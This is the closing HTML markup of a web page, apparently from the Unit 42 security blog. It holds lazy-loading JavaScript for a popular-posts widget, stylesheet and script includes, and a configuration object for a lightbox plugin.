                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
